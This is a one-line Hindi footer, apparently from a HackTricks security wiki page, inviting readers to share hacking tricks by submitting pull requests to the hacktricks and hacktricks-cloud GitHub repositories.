* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**।

</details>
